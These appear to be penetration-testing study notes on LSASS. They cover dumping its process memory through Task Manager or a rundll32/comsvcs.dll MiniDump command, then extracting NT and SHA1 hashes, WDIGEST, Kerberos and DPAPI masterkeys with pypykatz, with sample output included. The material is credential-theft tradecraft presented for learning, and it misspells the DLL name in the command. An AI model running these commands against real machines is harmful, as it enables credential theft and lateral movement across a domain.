# What is LSASS
LSASS is a core Windows process responsible for enforcing security policies, handling user authentication, and storing sensitive credential material in memory.

Upon initial login, lsass will: 
- cache creds locally in memory 
- create access tokens 
- enforce policies
- writes to window's security log
## Dumping LSASS process memory
Generating a memory dump of cached LSASS data
1. **Task manager method** 
	- Open task manager 
	- select the process tab
	- Right click LSA process
	- Create dump file
	- A file called `lsass.DMP` is created and saved in `%temp%`
2. **Rundll32.exe and Comsvcs.dll method**
	- Determine what `PID` is assigned to `lsass.exe` 
	cmd:
	```cmd 
	tasklist /svc
	```
	powershell:
	```powershell
	Get-Process lsass
	```
	- Create a dump file 
	```powershell
	rundll32 C:\windows\system32\comscvs.dll, MiniDump 672 C:\lsass.dmp full
	```
	With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`). Recall that most modern AV tools recognize this as malicious activity and prevent the command from executing
## Extracting credentials(pypykatz)
```bash
pypykatz lsa minidump /path/to/dump
```
important  info 
- MSV
 an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes associated with the bob user account's logon session stored in LSASS process memory
 ```shellsession
 sid S-1-5-21-4019466498-1700476312-3544718034-1001 luid 1354633 
 == MSV== 
 Username: bob Domain:
 DESKTOP-33E7O54 
 LM: NA NT: 64f12cddaa88057e06a81b54e73b949b 
 SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8 
 DPAPI: NA
 ```
 - WDIGEST
 `WDIGEST` is an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text
 ```shellsession
 == WDIGEST [14ab89]== 
 username bob 
 domainname DESKTOP-33E7O54 
 password None 
 password (hex)
 ```
 - kerberos
  a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS caches `passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.
 ```shellsession
 == Kerberos == 
 Username: bob 
 Domain: DESKTOP-33E7O54
 ```
- DPAPI
Mimikatz and Pypykatz can extract the DPAPI `masterkey` for logged-on users whose data is present in LSASS process memory. These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts.
```shellsession
== DPAPI [14ab89]== 
luid 1354633 key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b 
masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9......... sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

 